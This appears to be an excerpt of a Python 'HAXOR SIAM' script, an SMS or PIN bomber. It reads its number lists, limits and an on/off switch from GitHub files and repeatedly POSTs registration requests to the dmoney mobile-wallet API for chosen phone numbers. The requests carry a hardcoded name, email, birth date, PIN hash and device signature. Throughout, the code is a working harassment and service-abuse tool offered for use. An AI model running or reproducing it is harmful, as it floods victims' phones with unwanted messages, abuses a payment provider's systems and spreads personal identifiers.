...
try:
    numbers = str.split(requests.get('https://github.com/SIAMRAHMAN000/data/blob/main/protract.txt').text)
    # LIMIT GET
    global limit_str
    limit_str = requests.get('https://github.com/SIAMRAHMAN000/data/blob/main/limit.txt').text
    global time_speed
    time_s = requests.get('https://github.com/SIAMRAHMAN000/data/blob/main/time.txt').text
...
{s} ██████╔╝ {i}██║ {a}██║░░██║{m}██║░╚═╝░██║{h}
    ...
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}HAXOR SIAM {infoC}            ║
...
def main():
    ck_act = requests.get('https://github.com/SIAMRAHMAN000/data/blob/main/activity.txt').text
    # ck_act = 'active'
    clr()
    if 'active' in ck_act:
        pass
        ...
        printchar(f'{yellowBold}  {requests.get("https://github.com/SIAMRAHMAN000/data/blob/main/message.txt").text}', 0.005)
        sys.exit()
    banner()
    option()
...
def sent_pin_pre(number, amount,oparetor):
    ...
    while i < amount:
        ...
        try:
            ...
            "Accept-Encoding" : "gzip, deflate",
            "Content-Length" : "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"s14mbro1@gmail.com","fullName":"Siam Rahman","mobileNumber":"'+number+'","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
    ...
    for num in numbers_all:
        ...
        try:
            ...
            headers_dmoney = {
                ...
                "Accept-Encoding": "gzip, deflate",
                "Content-Length": "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"s14mbro1@gmail.com","fullName":"Siam Rahman","mobileNumber":"' + num + '","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            if requ_dmoney_server.status_code == 200:
